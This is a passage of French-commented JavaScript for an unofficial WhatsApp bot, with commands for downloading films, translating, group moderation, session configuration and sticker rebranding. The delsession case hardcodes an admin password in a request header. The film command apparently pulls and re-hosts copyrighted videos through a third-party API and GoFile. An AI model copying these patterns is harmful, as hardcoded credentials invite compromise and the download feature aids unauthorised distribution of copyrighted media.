                    interactiveMessage: {
                        body: { text: "🗣️ *Choisis la langue des sous-titres*\n\nSélectionne une langue ci-dessous pour commencer le téléchargement :" },
                        footer: { text: "© Doberto XD" },
                        header: { title: "📝 Sous-titres", subtitle: "", hasMediaAttachment: false },
                        nativeFlowMessage: {
                            buttons: [{ 
                                name: "single_select", 
                                buttonParamsJson: JSON.stringify({ title: "🌐 Choisir la langue", sections: sections }) 
                            }]
                        }
                    }
                }
            }
        }, { quoted: msg, userJid: sender });

        await socket.relayMessage(jid, interactiveMsg.message, { messageId: interactiveMsg.key.id });

    } catch (e) {
        console.error("[SMSUBS ERROR]", e.message);
        await socket.sendMessage(sender, { 
            text: `🩸 Erreur: ${e.message}` 
        }, { quoted: msg });
    }
    break;
}

// === COMMANDE TÉLÉCHARGEMENT FILM ===
case 'dlmovie': {
    try {
        const movieId = args[0];
        const season = (args[1] && args[1] !== 'null') ? args[1] : null; 
        const episode = (args[2] && args[2] !== 'null') ? args[2] : null; 
        const subLang = args.slice(3).join(" ");

        if (!movieId) {
            await socket.sendMessage(sender, { 
                text: "🩸 *Usage:* `.dlmovie <movie_id> [saison] [épisode] [langue]`" 
            }, { quoted: msg });
            break;
        }

        await socket.sendMessage(jid, { react: { text: '⏳', key: msg.key } });
        
        const subMsg = subLang ? `\n🗣️ *Sous-titres:* ${subLang}` : "";
        await socket.sendMessage(sender, { 
            text: `⏳ *Récupération des liens de téléchargement...*${subMsg}\n_Analyse de la taille du fichier..._` 
        }, { quoted: msg });

        const axios = require('axios');
        const fs = require('fs');
        const path = require('path');
        const FormData = require('form-data');

        let tempVidPath = null;

        const requestParams = { movie_id: movieId };
        if (season && episode) {
            requestParams.season = season;
            requestParams.episode = episode;
        }
        if (subLang) {
            requestParams.sub_lang = subLang;
        }

        const { data } = await axios.get(`https://darkvibe314-silent-movies-api.hf.space/api/download`, {
            params: requestParams,
            timeout: 30000
        });

        if (!data.download_url) throw new Error("URL vidéo introuvable.");

        const sizeMB = data.size_bytes ? parseFloat((parseInt(data.size_bytes) / (1024 * 1024)).toFixed(2)) : 0;
        let fileName = (season && episode) ? `Silent_Series_${movieId}_S${season}E${episode}.mp4` : `Silent_Movie_${movieId}.mp4`;

        if (sizeMB > 100) {
            await socket.sendMessage(sender, { 
                text: `📦 *Fichier supérieur à 100MB !* (${sizeMB} MB)\n_Téléchargement et upload vers GoFile pour contourner la limite WhatsApp. Cela prendra quelques minutes..._` 
            }, { quoted: msg });
            
            // Créer le dossier temp s'il n'existe pas
            const tempDir = './temp';
            if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });
            
            tempVidPath = path.join(tempDir, fileName);
            const writer = fs.createWriteStream(tempVidPath);
            
            const response = await axios({ 
                url: data.download_url, 
                method: 'GET', 
                responseType: 'stream',
                timeout: 300000 // 5 minutes pour le téléchargement
            });
            
            response.data.pipe(writer);
            
            await new Promise((resolve, reject) => { 
                writer.on('finish', resolve); 
                writer.on('error', reject); 
            });

            // Upload vers GoFile
            const { data: serverData } = await axios.get('https://api.gofile.io/servers');
            const server = serverData.data.servers[0].name;

            const form = new FormData();
            form.append('file', fs.createReadStream(tempVidPath));

            const { data: uploadData } = await axios.post(`https://${server}.gofile.io/contents/uploadfile`, form, {
                headers: form.getHeaders(),
                maxBodyLength: Infinity,
                maxContentLength: Infinity,
                timeout: 300000
            });

            if (!uploadData || uploadData.status !== 'ok') throw new Error("Upload GoFile échoué.");

            await socket.sendMessage(jid, {
                text: `🎬 *${fileName}*\n\n📦 *Taille:* ${sizeMB} MB\n🔗 *Lien GoFile:* ${uploadData.data.downloadPage}\n\n> _Fichier trop volumineux pour WhatsApp, uploadé sécurisé sur GoFile !_`,
                contextInfo: { forwardingScore: 999, isForwarded: true }
            }, { quoted: msg });

            // Nettoyer
            if (fs.existsSync(tempVidPath)) fs.unlinkSync(tempVidPath);

        } else {
            await socket.sendMessage(sender, { 
                text: `🎬 *Média trouvé !* (${sizeMB} MB)\n_Envoi direct vers WhatsApp..._` 
            }, { quoted: msg });
            
            await socket.sendMessage(jid, {
                document: { url: data.download_url },
                mimetype: 'video/mp4',
                fileName: fileName,
                caption: `🎬 *Téléchargé via BaseBot MD*\n📦 Taille: ${sizeMB} MB\n\n> _Astuce: Utilise VLC pour charger le fichier de sous-titres ci-dessous !_`,
                contextInfo: { forwardingScore: 999, isForwarded: true }
            }, { quoted: msg });
        }

        // Envoyer les sous-titres si disponibles
        if (data.subtitle_url) {
            try {
                let subName = (season && episode) 
                    ? `Sous-titres_${subLang || 'Default'}_S${season}E${episode}.srt` 
                    : `Sous-titres_${subLang || 'Default'}.srt`;
                
                const subRes = await axios.get(data.subtitle_url, { 
                    responseType: 'arraybuffer',
                    timeout: 30000 
                });
                
                await socket.sendMessage(jid, {
                    document: Buffer.from(subRes.data),
                    mimetype: 'application/x-subrip',
                    fileName: subName,
                    caption: `📝 *Sous-titres ${subLang || 'Anglais'}*\n_Charge ce fichier dans ton lecteur vidéo._`
                }, { quoted: msg });
            } catch (subErr) {
                console.error("[SUBTITLE FETCH ERROR]", subErr.message);
            }
        }

        await socket.sendMessage(jid, { react: { text: '✅', key: msg.key } });

    } catch (e) {
        console.error("[DLMOVIE ERROR]", e.message);
        
        // Nettoyer le fichier temporaire en cas d'erreur
        if (tempVidPath && fs.existsSync(tempVidPath)) {
            try { fs.unlinkSync(tempVidPath); } catch {}
        }
        
        const errorMsg = e.response?.data?.detail || e.message;
        await socket.sendMessage(jid, { react: { text: '❌', key: msg.key } });
        await socket.sendMessage(sender, { 
            text: `🩸 Erreur de téléchargement: ${errorMsg}` 
        }, { quoted: msg });
    }
    break;
}
      
// ============================================================
// TRANSLATE — Traduction via Google Translate
// ============================================================
case 'translate': {
  try {
    const { translate } = require('@vitalets/google-translate-api');

    const quotedCtx = msg.message?.extendedTextMessage?.contextInfo;
    const quotedMsg = quotedCtx?.quotedMessage;

    // ── Texte du message cité ──
    const quotedText = quotedMsg?.conversation
      || quotedMsg?.extendedTextMessage?.text
      || quotedMsg?.imageMessage?.caption
      || quotedMsg?.videoMessage?.caption
      || null;

    const isReply = !!quotedText;

    let lang = 'en';
    let text = '';

    if (isReply) {
      // ── Mode reply : .trt es → lang = es, text = message cité ──
      // Si args[0] est un code langue → l'utiliser
      // Si pas d'args → traduire en anglais par défaut
      lang = (args[0] && args[0].length === 2) ? args[0] : 'en';
      text = quotedText;
    } else {
      // ── Mode direct : .trt es Hello World ──
      if (!args.length) {
        await socket.sendMessage(sender, {
          text: `╭━━━━━━━━━━━━━━━━━━╮\n` +
                `┃  🌐 *DOBERTO XD TRANSLATE*\n` +
                `╰━━━━━━━━━━━━━━━━━━╯\n\n` +
                `❌ Aucun texte à traduire !\n\n` +
                `*Usage :*\n` +
                `  ${prefix}tr <langue> <texte>\n` +
                `  ${prefix}tr <texte> _(→ anglais)_\n\n` +
                `*En réponse à un message :*\n` +
                `  ${prefix}tr es _(traduit en espagnol)_\n` +
                `  ${prefix}tr _(traduit en anglais)_\n\n` +
                `*Exemples :*\n` +
                `  ${prefix}tr fr Hello World\n` +
                `  ${prefix}tr es Bonjour tout le monde\n\n` +
                `📋 *Langues :* https://cloud.google.com/translate/docs/languages\n\n` +
                `> ${config.BOT_FOOTER}`
        }, { quoted: msg });
        break;
      }

      // Premier arg = code langue (2 chars) ou tout est le texte
      if (args[0].length === 2) {
        lang = args[0];
        text = args.slice(1).join(' ').trim();
      } else {
        lang = 'en';
        text = args.join(' ').trim();
      }

      if (!text) {
        await socket.sendMessage(sender, {
          text: `❌ Texte manquant.\n*Usage :* ${prefix}tr <langue> <texte>`
        }, { quoted: msg });
        break;
      }
    }

    await socket.sendMessage(from, { react: { text: '🌐', key: msg.key } });

    // ── Traduction ──
    const result = await translate(text, { to: lang, autoCorrect: true });

    if (!result?.text) throw new Error('Traduction échouée.');

    const fromLang = result?.raw?.src
      || result?.from?.language?.iso
      || '?';

    await socket.sendMessage(sender, {
      text: `╭━━━━━━━━━━━━━━━━━━╮\n` +
            `┃  🌐 *DOBERTO XD TRANSLATE*\n` +
            `╰━━━━━━━━━━━━━━━━━━╯\n\n` +
            `🔤 *Original* _(${fromLang})_ :\n${text}\n\n` +
            `━━━━━━━━━━━━━━━━━━\n\n` +
            `✅ *Traduction* _(${lang})_ :\n${result.text}\n\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `> ${config.BOT_FOOTER}`
    }, { quoted: msg });

    await socket.sendMessage(from, { react: { text: '✅', key: msg.key } });

  } catch (e) {
    console.error('[TRANSLATE ERROR]', e);
    await socket.sendMessage(from, { react: { text: '❌', key: msg.key } });
    await socket.sendMessage(sender, {
      text: `╭━━━━━━━━━━━━━━━━━━╮\n` +
            `┃  🌐 *DOBERTO XD TRANSLATE*\n` +
            `╰━━━━━━━━━━━━━━━━━━╯\n\n` +
            `❌ Échec de la traduction.\n\n` +
            `_${e.message || e}_\n\n` +
            `💡 Vérifie le code langue :\n` +
            `https://cloud.google.com/translate/docs/languages\n\n` +
            `> ${config.BOT_FOOTER}`
    }, { quoted: msg });
  }
  break;
}

case 'antitag': {
          try {
            // Optionnel : restreindre au propriétaire
            if (!isOwner) {
              await socket.sendMessage(sender, { 
                text: '❌ Seul le propriétaire peut utiliser cette commande.' 
              }, { quoted: msg });
              break;
            }

            const validModes = ['off', 'delete', 'remove'];
            const newMode = args[0]?.toLowerCase();

            if (!newMode || !validModes.includes(newMode)) {
              await socket.sendMessage(sender, {
                text: `❌ Mode invalide. Utilise : ${validModes.join(' | ')}`
              }, { quoted: msg });
              break;
            }

            // Récupérer le numéro de la session (le bot) pour la config
            const botNumberForConfig = socket.user?.id?.split(':')[0] + '@s.whatsapp.net' || socket.user?.id;
            if (!botNumberForConfig) throw new Error('Impossible de récupérer le numéro du bot');

            // Charger la config actuelle du bot
            const currentConfig = await loadUserConfigFromMongo(botNumberForConfig) || {};

            // Mettre à jour avec le nouveau mode
            currentConfig.ANTI_TAG_MODE = newMode;

            // Sauvegarder en base
            await setUserConfigInMongo(botNumberForConfig, currentConfig);

            await socket.sendMessage(sender, {
              text: `✅ Anti-tag réglé sur : *${newMode}*`
            }, { quoted: msg });

          } catch (e) {
            console.error('[ANTITAG CMD ERROR]', e);
            await socket.sendMessage(sender, { text: `❌ Erreur: ${e.message}` }, { quoted: msg });
          }
          break;
        }        
          
case 'delsession': {
  try {
    const senderNum = (nowsender || '').split('@')[0];
    const ownerNum = String(config.OWNER_NUMBER || '').replace(/[^0-9]/g, '');

    // Vérification : seul le Owner global peut utiliser cette commande
    if (senderNum !== ownerNum) {
      await socket.sendMessage(sender, {
        text: '❌ Seul le propriétaire global du bot peut utiliser cette commande.'
      }, { quoted: msg });
      break;
    }

    // Vérifier argument
    const target = (args[0] || '').replace(/[^0-9]/g, '');
    if (!target) {
      await socket.sendMessage(sender, {
        text: '⚙️ *DELETE SESSION*\n\nUsage: .delsession [numéro]\nEx: .delsession 00000000000'
      }, { quoted: msg });
      break;
    }

    // Appeler l’API /api/session/delete
    const fetch = require('node-fetch');
    const resp = await fetch('http://localhost:2036/api/session/delete', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-admin-pass': 'adminowner' // mot de passe global
      },
      body: JSON.stringify({ number: target })
    });

    let data;
    try {
      data = await resp.json();
    } catch (e) {
      const text = await resp.text();
      await socket.sendMessage(sender, {
        text: `❌ Réponse non JSON du serveur : ${text}`
      }, { quoted: msg });
      break;
    }

    if (data.ok) {
      await socket.sendMessage(sender, {
        text: `✅ Session ${target} supprimée via API.`
      }, { quoted: msg });
    } else {
      await socket.sendMessage(sender, {
        text: `❌ Échec : ${data.error || 'Réponse inattendue'}`
      }, { quoted: msg });
    }

  } catch (err) {
    console.error('[DELSESSION ERROR]', err);
    await socket.sendMessage(sender, {
      text: `❌ Erreur lors de la suppression : ${err.message || err}`
    }, { quoted: msg });
  }
  break;
}

 case 'detect': {
  try {
    // Récupérer la source du message (supporte conversation simple et extendedTextMessage)
    const raw = msg.message || {};
    const quoted = raw.extendedTextMessage?.contextInfo?.quotedMessage
      || raw.extendedTextMessage?.contextInfo?.stanzaId && raw.extendedTextMessage?.contextInfo?.quotedMessage
      || raw.imageMessage?.contextInfo?.quotedMessage
      || raw.videoMessage?.contextInfo?.quotedMessage
      || raw.audioMessage?.contextInfo?.quotedMessage
      || null;

    // Si la commande n'est pas utilisée en réponse, on informe l'utilisateur
    if (!quoted) {
      await socket.sendMessage(sender, {
        text: 'ℹ️ Utilisation : répondez à un message puis envoyez la commande .detect pour voir sa structure.'
      }, { quoted: msg });
      break;
    }

    // Helper : extraire le type principal du message cité
    function detectMessageType(q) {
      if (!q) return 'unknown';
      const keys = Object.keys(q);
      // Priorité sur les types connus
      const types = ['conversation','extendedTextMessage','imageMessage','videoMessage','audioMessage','stickerMessage','documentMessage','contactMessage','locationMessage','productMessage','buttonsResponseMessage','listResponseMessage','templateMessage'];
      for (const t of types) if (q[t]) return t;
      // fallback : premier key non metadata
      return keys.length ? keys[0] : 'unknown';
    }

    // Helper : construire un objet résumé sans données binaires lourdes
    function summarizeMessage(q) {
      const type = detectMessageType(q);
      const summary = { type, rawKeys: Object.keys(q) };

      // texte
      if (q.conversation) summary.text = q.conversation;
      if (q.extendedTextMessage) {
        summary.extendedText = q.extendedTextMessage.text || null;
        summary.extendedContext = q.extendedTextMessage.contextInfo ? {
          stanzaId: q.extendedTextMessage.contextInfo.stanzaId || null,
          participant: q.extendedTextMessage.contextInfo.participant || null,
          quotedMessageKeys: q.extendedTextMessage.contextInfo.quotedMessage ? Object.keys(q.extendedTextMessage.contextInfo.quotedMessage) : null
        } : null;
      }

      // image
      if (q.imageMessage) {
        summary.image = {
          mimetype: q.imageMessage.mimetype || null,
          caption: q.imageMessage.caption || null,
          fileSha256: q.imageMessage.fileSha256 ? Buffer.from(q.imageMessage.fileSha256).toString('hex') : null,
          fileLength: q.imageMessage.fileLength || null,
          url: q.imageMessage.url || null
        };
      }

      // video
      if (q.videoMessage) {
        summary.video = {
          mimetype: q.videoMessage.mimetype || null,
          caption: q.videoMessage.caption || null,
          seconds: q.videoMessage.seconds || null,
          fileLength: q.videoMessage.fileLength || null,
          url: q.videoMessage.url || null
        };
      }

      // audio
      if (q.audioMessage) {
        summary.audio = {
          mimetype: q.audioMessage.mimetype || null,
          seconds: q.audioMessage.seconds || null,
          ptt: !!q.audioMessage.ptt,
          fileLength: q.audioMessage.fileLength || null,
          url: q.audioMessage.url || null
        };
      }

      // document
      if (q.documentMessage) {
        summary.document = {
          fileName: q.documentMessage.fileName || null,
          mimetype: q.documentMessage.mimetype || null,
          fileLength: q.documentMessage.fileLength || null,
          url: q.documentMessage.url || null
        };
      }

      // sticker
      if (q.stickerMessage) {
        summary.sticker = {
          isAnimated: !!q.stickerMessage.isAnimated,
          isVideo: !!q.stickerMessage.isVideo,
          fileSha256: q.stickerMessage.fileSha256 ? Buffer.from(q.stickerMessage.fileSha256).toString('hex') : null
        };
      }

      // contact / location / product
      if (q.contactMessage) summary.contact = { displayName: q.contactMessage.displayName || null, vcard: !!q.contactMessage.vcard };
      if (q.locationMessage) summary.location = { degreesLatitude: q.locationMessage.degreesLatitude || null, degreesLongitude: q.locationMessage.degreesLongitude || null, name: q.locationMessage.name || null };
      if (q.productMessage) summary.product = { productId: q.productMessage.product?.id || null, title: q.productMessage.product?.title || null };

      // metadata utile
      if (q.contextInfo) {
        summary.contextInfo = {
          mentionedJid: q.contextInfo.mentionedJid || null,
          externalAdReply: q.contextInfo.externalAdReply ? {
            title: q.contextInfo.externalAdReply.title || null,
            mediaType: q.contextInfo.externalAdReply.mediaType || null,
            mediaUrl: q.contextInfo.externalAdReply.mediaUrl || null
          } : null
        };
      }

      return summary;
    }

    // Construire le rapport
    const report = {
      inspectedAt: new Date().toISOString(),
      chat: msg.key?.remoteJid || 'unknown',
      isGroup: (msg.key?.remoteJid || '').endsWith('@g.us'),
      quotedMessageKey: {
        id: raw.extendedTextMessage?.contextInfo?.stanzaId || raw.extendedTextMessage?.contextInfo?.quotedMessage?.key?.id || null,
        participant: raw.extendedTextMessage?.contextInfo?.participant || raw.extendedTextMessage?.contextInfo?.quotedMessage?.key?.participant || null
      },
      summary: summarizeMessage(quoted)
    };

    // Envoyer le rapport formaté (limiter la taille)
    const pretty = JSON.stringify(report, null, 2);
    const MAX_LEN = 1500;
    if (pretty.length <= MAX_LEN) {
      await socket.sendMessage(sender, { text: `🔍 Résultat de l'inspection :\n\n${pretty}` }, { quoted: msg });
    } else {
      // découper en plusieurs messages si trop long
      const chunks = [];
      for (let i = 0; i < pretty.length; i += MAX_LEN) chunks.push(pretty.slice(i, i + MAX_LEN));
      await socket.sendMessage(sender, { text: '🔍 Rapport trop long, envoi en plusieurs parties...' }, { quoted: msg });
      for (const c of chunks) {
        await socket.sendMessage(sender, { text: '```json\n' + c + '\n```' }, { quoted: msg });
      }
    }

  } catch (err) {
    console.error('[DETECT CASE ERROR]', err);
    try {
      await socket.sendMessage(sender, { text: `❌ Erreur lors de l'inspection : ${err.message || err}` }, { quoted: msg });
    } catch (e) { /* ignore */ }
  }
  break;
}         
// ============ COMMANDES DE GROUPE ========

case 'config': {
  try {
    const sub = (args[0] || '').toLowerCase();
    const param = args.slice(1).join(' ').trim();
    const sanitized = (number || '').replace(/[^0-9]/g, '');
    const senderNum = (nowsender || '').split('@')[0];
    const ownerNum = config.OWNER_NUMBER.replace(/[^0-9]/g, '');

    // permission : seul le propriétaire de la session ou le bot owner peut modifier
    if (senderNum !== sanitized && senderNum !== ownerNum) {
      const shonux = {
        key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_AI_CONFIG_DENY1" },
        message: { contactMessage: { displayName: BOT_NAME_FANCY, vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${BOT_NAME_FANCY};;;;\nFN:${BOT_NAME_FANCY}\nEND:VCARD` } }
      };
      await socket.sendMessage(sender, { text: '❌ Permission denied. Only the session owner or bot owner can change session config.' }, { quoted: shonux });
      break;
    }

    // charger config existante (ou objet vide)
    let cfg = await loadUserConfigFromMongo(sanitized) || {};

    switch (sub) {
      case 'autoview': {
        const val = (args[1] || '').toLowerCase();
        if (val === 'on' || val === 'off') {
          cfg.AUTO_VIEW_STATUS = val === 'on';
          await setUserConfigInMongo(sanitized, cfg);
          await socket.sendMessage(sender, { text: `✅ AUTO_VIEW_STATUS set to ${cfg.AUTO_VIEW_STATUS ? 'ON' : 'OFF'}` }, { quoted: msg });
        } else {
          await socket.sendMessage(sender, { text: 'Usage: .config autoview on|off' }, { quoted: msg });
        }
        break;
      }

      case 'autolike': {
        const val = (args[1] || '').toLowerCase();
        if (val === 'on' || val === 'off') {
          cfg.AUTO_LIKE_STATUS = val === 'on';
          await setUserConfigInMongo(sanitized, cfg);
          await socket.sendMessage(sender, { text: `✅ AUTO_LIKE_STATUS set to ${cfg.AUTO_LIKE_STATUS ? 'ON' : 'OFF'}` }, { quoted: msg });
        } else {
          await socket.sendMessage(sender, { text: 'Usage: .config autolike on|off' }, { quoted: msg });
        }
        break;
      }

      case 'autorec': {
        const val = (args[1] || '').toLowerCase();
        if (val === 'on' || val === 'off') {
          cfg.AUTO_RECORDING = val === 'on';
          await setUserConfigInMongo(sanitized, cfg);
          await socket.sendMessage(sender, { text: `✅ AUTO_RECORDING set to ${cfg.AUTO_RECORDING ? 'ON' : 'OFF'}` }, { quoted: msg });
        } else {
          await socket.sendMessage(sender, { text: 'Usage: .config autorec on|off' }, { quoted: msg });
        }
        break;
      }

      case 'setemoji': {
        if (!param) {
          await socket.sendMessage(sender, { text: 'Usage: .config setemoji <emoji1> <emoji2> ...' }, { quoted: msg });
          break;
        }
        // split par espaces, garder les emojis non vides
        const emojis = param.split(/\s+/).filter(Boolean);
        if (!emojis.length) {
          await socket.sendMessage(sender, { text: 'Aucun emoji valide fourni.' }, { quoted: msg });
          break;
        }
        cfg.AUTO_LIKE_EMOJI = emojis;
        await setUserConfigInMongo(sanitized, cfg);
        await socket.sendMessage(sender, { text: `✅ AUTO_LIKE_EMOJI updated: ${emojis.join(' ')}` }, { quoted: msg });
        break;
      }

      case 'setprefix': {
        const newPrefix = args[1] || '';
        if (!newPrefix) {
          await socket.sendMessage(sender, { text: 'Usage: .config setprefix <prefix>' }, { quoted: msg });
          break;
        }
        cfg.PREFIX = newPrefix;
        await setUserConfigInMongo(sanitized, cfg);
        await socket.sendMessage(sender, { text: `✅ PREFIX set to: ${newPrefix}` }, { quoted: msg });
        break;
      }

      case 'show':
      case 'get': {
        // fusionner avec defaults si tu utilises loadSessionConfigMerged ailleurs ; ici on montre ce qui est en DB
        const merged = { 
          AUTO_VIEW_STATUS: typeof cfg.AUTO_VIEW_STATUS === 'undefined' ? true : cfg.AUTO_VIEW_STATUS,
          AUTO_LIKE_STATUS: typeof cfg.AUTO_LIKE_STATUS === 'undefined' ? true : cfg.AUTO_LIKE_STATUS,
          AUTO_RECORDING: typeof cfg.AUTO_RECORDING === 'undefined' ? false : cfg.AUTO_RECORDING,
          AUTO_LIKE_EMOJI: Array.isArray(cfg.AUTO_LIKE_EMOJI) && cfg.AUTO_LIKE_EMOJI.length ? cfg.AUTO_LIKE_EMOJI : ['🐉','🔥','💀','👑','💪','😎','🇭🇹','⚡','🩸','❤️'],
          PREFIX: cfg.PREFIX || '.',
          antidelete: cfg.antidelete === true
        };
        const text = [
          `🔧 Session config for ${sanitized}:`,
          `AUTO_VIEW_STATUS: ${merged.AUTO_VIEW_STATUS}`,
          `AUTO_LIKE_STATUS: ${merged.AUTO_LIKE_STATUS}`,
          `AUTO_RECORDING: ${merged.AUTO_RECORDING}`,
          `AUTO_LIKE_EMOJI: ${merged.AUTO_LIKE_EMOJI.join(' ')}`,
          `PREFIX: ${merged.PREFIX}`,
          `ANTIDELETE: ${merged.antidelete ? 'ON' : 'OFF'}`
        ].join('\n');
        await socket.sendMessage(sender, { text }, { quoted: msg });
        break;
      }

      default: {
        // aide rapide
        const help = [
          'Config commands:',
          '.config autoview on|off',
          '.config autolike on|off',
          '.config autorec on|off',
          '.config setlikeemoji <emoji1> <emoji2> ...',
          '.config setprefix <prefix>',
          '.config show'
        ].join('\n');
        await socket.sendMessage(sender, { text: help }, { quoted: msg });
        break;
      }
    }
  } catch (err) {
    console.error('config case error', err);
    await socket.sendMessage(sender, { text: `❌ Error updating config: ${err.message || err}` }, { quoted: msg });
  }
  break;
}
// CASE: welcome
case 'welcome': {
  try {
    if (!from.endsWith('@g.us')) {
      await socket.sendMessage(from, { text: '❗ Cette commande fonctionne uniquement dans un groupe.' }, { quoted: msg });
      break;
    }

    const sub = (args[0] || '').toLowerCase();
    // .welcome on | off | status | set <message> | reset
    if (sub === 'on') {
      toggleWelcome(from, true);
      await socket.sendMessage(from, { text: '✅ Mode Welcome activé.' }, { quoted: msg });
    } else if (sub === 'off') {
      toggleWelcome(from, false);
      await socket.sendMessage(from, { text: '❌ Mode Welcome désactivé.' }, { quoted: msg });
    } else if (sub === 'status') {
      const state = isWelcomeEnabled(from) ? 'activé ✅' : 'désactivé ❌';
      await socket.sendMessage(from, { text: `ℹ️ Le mode Welcome est actuellement ${state}.` }, { quoted: msg });
    } else if (sub === 'set') {
      // .welcome set Ton message {user} {group}
      const template = args.slice(1).join(' ').trim();
      if (!template) {
        await socket.sendMessage(from, { text: `❗ Fournis le message après ${prefix}welcome set\nEx: ${prefix}welcome set Bienvenue {user} dans {group} !` }, { quoted: msg });
        break;
      }
      setWelcomeTemplate(from, template);
      await socket.sendMessage(from, { text: '✅ Message de bienvenue personnalisé enregistré.' }, { quoted: msg });
    } else if (sub === 'reset') {
      setWelcomeTemplate(from, null);
      await socket.sendMessage(from, { text: '♻️ Message de bienvenue réinitialisé au thème BaseBot par défaut.' }, { quoted: msg });
    } else {
      // aide rapide
      await socket.sendMessage(from, {
        text:
`Usage Welcome:
${prefix}welcome on — activer
${prefix}welcome off — désactiver
${prefix}welcome status — état actuel
${prefix}welcome set <message> — définir message (placeholders: {user}, {userName}, {group})
${prefix}welcome reset — remettre le message par défaut`
      }, { quoted: msg });
    }
  } catch (err) {
    console.error('WELCOME CASE ERROR', err);
    await socket.sendMessage(from, { text: '❌ Erreur lors de la gestion du mode Welcome.' }, { quoted: msg });
  }
  break;
}


// CASE: goodbye
case 'goodbye': {
  try {
    if (!from.endsWith('@g.us')) {
      await socket.sendMessage(from, { text: '❗ Cette commande fonctionne uniquement dans un groupe.' }, { quoted: msg });
      break;
    }

    const sub = (args[0] || '').toLowerCase();
    // .goodbye on | off | status | set <message> | reset
    if (sub === 'on') {
      toggleGoodbye(from, true);
      await socket.sendMessage(from, { text: '✅ Mode Goodbye activé.' }, { quoted: msg });
    } else if (sub === 'off') {
      toggleGoodbye(from, false);
      await socket.sendMessage(from, { text: '❌ Mode Goodbye désactivé.' }, { quoted: msg });
    } else if (sub === 'status') {
      const state = isGoodbyeEnabled(from) ? 'activé ✅' : 'désactivé ❌';
      await socket.sendMessage(from, { text: `ℹ️ Le mode Goodbye est actuellement ${state}.` }, { quoted: msg });
    } else if (sub === 'set') {
      // .goodbye set Ton message {user} {group}
      const template = args.slice(1).join(' ').trim();
      if (!template) {
        await socket.sendMessage(from, { text: `❗ Fournis le message après ${prefix}goodbye set\nEx: ${prefix}goodbye set Au revoir {user}, bon vent !` }, { quoted: msg });
        break;
      }
      setGoodbyeTemplate(from, template);
      await socket.sendMessage(from, { text: '✅ Message d\'au revoir personnalisé enregistré.' }, { quoted: msg });
    } else if (sub === 'reset') {
      setGoodbyeTemplate(from, null);
      await socket.sendMessage(from, { text: '♻️ Message d\'au revoir réinitialisé au thème BaseBot par défaut.' }, { quoted: msg });
    } else {
      // aide rapide
      await socket.sendMessage(from, {
        text:
`${prefix}goodbye on — activer
${prefix}goodbye off — désactiver
${prefix}goodbye status — état actuel
${prefix}goodbye set <message> — définir message (placeholders: {user}, {userName}, {group})
${prefix}goodbye reset — remettre le message par défaut`
      }, { quoted: msg });
    }
  } catch (err) {
    console.error('GOODBYE CASE ERROR', err);
    await socket.sendMessage(from, { text: '❌ Erreur lors de la gestion du mode Goodbye.' }, { quoted: msg });
  }
  break;
}

// Case swgc à coller dans ton switch principal
// Utilise le module status.js et ton client nommé socket

// ============================================================
// TAKE — Renommer un sticker (titre + auteur BASEBOT-MD)
// ============================================================
case 'take': {
  try {
    const webp   = require('node-webpmux');
    const crypto = require('crypto');

    // ── Vérifier qu'il y a un sticker cité ──
    const quotedCtx = msg.message?.extendedTextMessage?.contextInfo;
    const quotedMsg = quotedCtx?.quotedMessage;

    const stickerMsg = quotedMsg?.stickerMessage
      || msg.message?.stickerMessage
      || null;

    if (!stickerMsg) {
      await socket.sendMessage(sender, {
        text: `╭━━━━━━━━━━━━━━━━━━╮\n` +
              `┃  🎨 *DOBERTO XD TAKE*\n` +
              `╰━━━━━━━━━━━━━━━━━━╯\n\n` +
              `❌ Réponds à un sticker !\n\n` +
              `*Usage :*\n` +
              `  ${prefix}take → titre = ton nom\n` +
              `  ${prefix}take <titre> → titre perso\n\n` +
              `> ${config.BOT_FOOTER}`
      }, { quoted: msg });
      break;
    }

    const packname = args.join(' ').trim() || nowsender.split('@')[0];
    const author   = 'DOBERTO-XD';

    await socket.sendMessage(from, { react: { text: '🎨', key: msg.key } });

    // ── Télécharger le sticker ──
    const stream = await downloadContentFromMessage(stickerMsg, 'sticker');
    const chunks = [];
    for await (const chunk of stream) chunks.push(chunk);
    const stickerBuffer = Buffer.concat(chunks);

    if (!stickerBuffer || stickerBuffer.length === 0) {
      throw new Error('Téléchargement du sticker échoué.');
    }

    // ── addExif ──
    async function addExif(webpSticker, packName, authorName, categories = [''], extra = {}) {
      const img           = new webp.Image();
      const stickerPackId = crypto.randomBytes(32).toString('hex');
      const json          = {
        'sticker-pack-id': stickerPackId,
        'sticker-pack-name': packName,
        'sticker-pack-publisher': authorName,
        'emojis': categories,
        ...extra
      };
      const exifAttr   = Buffer.from([
        0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00,
        0x01, 0x00, 0x41, 0x57, 0x07, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x16, 0x00, 0x00, 0x00
      ]);
      const jsonBuffer = Buffer.from(JSON.stringify(json), 'utf8');
      const exif       = Buffer.concat([exifAttr, jsonBuffer]);
      exif.writeUIntLE(jsonBuffer.length, 14, 4);
      await img.load(webpSticker);
      img.exif = exif;
      return await img.save(null);
    }

    const result = await addExif(stickerBuffer, packname, author);
    if (!result) throw new Error('Échec de l\'application des métadonnées.');

    await socket.sendMessage(sender, { sticker: result }, { quoted: msg });
    await socket.sendMessage(from, { react: { text: '✅', key: msg.key } });

  } catch (e) {
    console.error('[TAKE ERROR]', e);
    await socket.sendMessage(from, { react: { text: '❌', key: msg.key } });
    await socket.sendMessage(sender, {
      text: `❌ Échec du renommage.\n_${e.message || e}_`
    }, { quoted: msg });
  }
  break;
}
case 'antilink': {
  try {
    if (!from.endsWith('@g.us')) {
      await socket.sendMessage(from, { text: '❗ Cette commande fonctionne uniquement dans un groupe.' }, { quoted: msg });
      break;
    }

    const arg = args[0]?.toLowerCase();
    if (arg === 'on') {
      toggleAntiLink(from, true);
      await socket.sendMessage(from, { text: '✅ Mode Anti-Link activé.' }, { quoted: msg });
    } else if (arg === 'off') {
      toggleAntiLink(from, false);
      await socket.sendMessage(from, { text: '❌ Mode Anti-Link désactivé.' }, { quoted: msg });
    } else {
      const state = isAntiLinkEnabled(from) ? 'activé ✅' : 'désactivé ❌';
      await socket.sendMessage(from, { text: `ℹ️ Le mode Anti-Link est actuellement ${state}.\nUtilise: ${prefix}${command} on/off` }, { quoted: msg });
    }
